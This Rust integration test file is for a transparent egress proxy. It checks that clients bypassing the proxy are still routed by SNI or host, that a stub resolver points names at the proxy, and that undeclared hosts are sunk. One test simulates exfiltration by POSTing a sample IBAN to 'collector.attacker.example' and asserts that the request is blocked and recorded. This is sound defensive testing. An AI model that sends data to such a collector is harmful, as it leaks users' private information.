//! Transparent egress (ADR-0027) through a real proxy: a client that uses
//! no proxy at all, whose names resolve to the proxy's listeners, still
//! goes through the connect gate, the sink and the pipeline.

use std::io::BufRead;
use std::net::SocketAddr;
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

use can_policy::config::{EgressMode, HostBlock, NetworkConfig, UndeclaredHosts};
use can_proxy::ca::DynamicCa;
use can_proxy::server::{ProxyServer, ProxyServerConfig, TransparentListeners};
use http_body_util::{BodyExt, Full};
use hyper::service::service_fn;
use hyper::{Request, Response, StatusCode};
use reqwest::Client;
use tokio::net::{TcpListener, UdpSocket};

/// The installed event stream is process-global; one test owns it at a time.
static EVENT_STREAM: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());

struct Transparent {
    tls: SocketAddr,
    http: SocketAddr,
    dns: SocketAddr,
}

/// An HTTP upstream on 127.0.0.1 that counts the requests it answers.
async fn start_upstream() -> (u16, Arc<AtomicUsize>) {
    let listener = TcpListener::bind("127.0.0.1:0").await.expect("bind");
    let port = listener.local_addr().expect("addr").port();
    let served = Arc::new(AtomicUsize::new(0));
    let counter = served.clone();

    tokio::spawn(async move {
        while let Ok((stream, _)) = listener.accept().await {
            let counter = counter.clone();
            tokio::spawn(async move {
                let service = service_fn(move |req: Request<hyper::body::Incoming>| {
                    counter.fetch_add(1, Ordering::SeqCst);
                    let path = req.uri().path().to_string();
                    async move {
                        Ok::<_, hyper::Error>(Response::new(
                            Full::new(bytes::Bytes::from(format!("upstream saw {path}")))
                                .map_err(|never| match never {})
                                .boxed(),
                        ))
                    }
                });
                let _ = hyper::server::conn::http1::Builder::new()
                    .serve_connection(hyper_util::rt::TokioIo::new(stream), service)
                    .await;
            });
        }
    });

    (port, served)
}

async fn start_proxy(upstream_port: u16) -> Transparent {
    let ca = Arc::new(DynamicCa::generate().expect("ca"));
    let network = NetworkConfig {
        egress: Some(EgressMode::ProxyOnly),
        undeclared_hosts: Some(UndeclaredHosts::Sink),
        transparent: Some(true),
        allow_host_loopback: true,
        ..Default::default()
    };
    let hosts = vec![HostBlock {
        domain: "mock.example".to_string(),
        upstream: Some(format!("loopback:{upstream_port}")),
        ..Default::default()
    }];
    let config = ProxyServerConfig::new(ca)
        .with_network(network)
        .with_hosts(hosts)
        .with_host_loopback_target("127.0.0.1".parse().expect("ip"));
    let proxy = ProxyServer::new(config).expect("proxy");

    let listener = TcpListener::bind("127.0.0.1:0").await.expect("bind proxy");
    let tls = TcpListener::bind("127.0.0.1:0").await.expect("bind tls");
    let http = TcpListener::bind("127.0.0.1:0").await.expect("bind http");
    let dns = UdpSocket::bind("127.0.0.1:0").await.expect("bind dns");
    let addresses = Transparent {
        tls: tls.local_addr().expect("tls addr"),
        http: http.local_addr().expect("http addr"),
        dns: dns.local_addr().expect("dns addr"),
    };

    tokio::spawn(async move {
        let _ = proxy
            .run_transparent(listener, TransparentListeners { tls, http, dns })
            .await;
    });
    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    addresses
}

/// A client that ignores proxies, as a resolver pointing every name at the
/// proxy would have it.
fn direct_client(name: &str, to: SocketAddr) -> Client {
    Client::builder()
        .no_proxy()
        .resolve(name, to)
        // The proxy terminates TLS with a CA generated for this run.
        .danger_accept_invalid_certs(true)
        .build()
        .expect("client")
}

fn install_events(dir: &std::path::Path) -> std::thread::JoinHandle<Vec<String>> {
    let socket_path = dir.join("events.sock");
    let listener = std::os::unix::net::UnixListener::bind(&socket_path).expect("bind events");
    let handle = std::thread::spawn(move || {
        let (conn, _addr) = listener.accept().expect("accept");
        std::io::BufReader::new(conn)
            .lines()
            .map_while(Result::ok)
            .collect()
    });
    let config = can_events::EventConfig {
        target: can_events::EventTarget::Socket(socket_path),
        run_id: "r-transparent".to_string(),
        capture: can_events::CaptureConfig::default(),
        stats_interval_ms: None,
        seal_key: None,
    };
    can_events::install(
        can_events::EventStream::open(&config, can_events::StreamId::Proxy).expect("connect"),
    );
    handle
}

#[tokio::test(flavor = "multi_thread")]
async fn a_tls_client_that_ignores_the_proxy_reaches_a_declared_host_by_sni() {
    let _exclusive = EVENT_STREAM.lock().await;
    let (upstream, served) = start_upstream().await;
    let proxy = start_proxy(upstream).await;

    let response = direct_client("mock.example", proxy.tls)
        .get(format!(
            "https://mock.example:{}/tickets/4711",
            proxy.tls.port()
        ))
        .send()
        .await
        .expect("request");

    assert_eq!(response.status(), StatusCode::OK);
    assert_eq!(
        response.text().await.expect("body"),
        "upstream saw /tickets/4711"
    );
    assert_eq!(served.load(Ordering::SeqCst), 1);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_plain_http_client_that_ignores_the_proxy_is_routed_by_host() {
    let _exclusive = EVENT_STREAM.lock().await;
    let (upstream, served) = start_upstream().await;
    let proxy = start_proxy(upstream).await;

    let response = direct_client("mock.example", proxy.http)
        .get(format!("http://mock.example:{}/plain", proxy.http.port()))
        .send()
        .await
        .expect("request");

    assert_eq!(response.status(), StatusCode::OK);
    assert_eq!(response.text().await.expect("body"), "upstream saw /plain");
    assert_eq!(served.load(Ordering::SeqCst), 1);
}

#[tokio::test(flavor = "multi_thread")]
async fn an_undeclared_host_reached_directly_is_sunk_and_recorded() {
    let _exclusive = EVENT_STREAM.lock().await;
    let dir = tempfile::tempdir().expect("tempdir");
    let events = install_events(dir.path());
    let (upstream, served) = start_upstream().await;
    let proxy = start_proxy(upstream).await;

    let response = direct_client("collector.attacker.example", proxy.tls)
        .post(format!(
            "https://collector.attacker.example:{}/in",
            proxy.tls.port()
        ))
        .body("iban=CH9300762011623852957")
        .send()
        .await
        .expect("the sink answers");

    assert_eq!(response.status(), StatusCode::FORBIDDEN);
    assert_eq!(served.load(Ordering::SeqCst), 0, "nothing was forwarded");

    can_events::uninstall();
    let lines = events.join().expect("events");
    let sunk: Vec<serde_json::Value> = lines
        .iter()
        .map(|line| serde_json::from_str(line).expect("json"))
        .filter(|e: &serde_json::Value| {
            e["event"] == "egress_request" && e["data"]["reason"] == "sink"
        })
        .collect();

    assert!(
        sunk.iter().any(
            |e| e["data"]["host"] == "collector.attacker.example" && e["data"]["path"] == "/in"
        ),
        "the attempt is recorded with the request it carried: {sunk:?}"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn the_stub_resolver_points_every_name_at_the_proxy() {
    let _exclusive = EVENT_STREAM.lock().await;
    let proxy = start_proxy(1).await;
    let socket = UdpSocket::bind("127.0.0.1:0").await.expect("bind");

    let mut query = vec![0xAB, 0xCD, 0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0];
    for label in ["helpdesk", "example", "com"] {
        query.push(label.len() as u8);
        query.extend_from_slice(label.as_bytes());
    }
    query.extend_from_slice(&[0, 0, 1, 0, 1]);
    socket.send_to(&query, proxy.dns).await.expect("send");

    let mut buffer = [0u8; 512];
    let (len, _from) = tokio::time::timeout(
        std::time::Duration::from_secs(2),
        socket.recv_from(&mut buffer),
    )
    .await
    .expect("answered in time")
    .expect("recv");

    assert_eq!(&buffer[..2], &[0xAB, 0xCD]);
    assert_eq!(&buffer[len - 4..len], &[127, 0, 0, 1]);
}
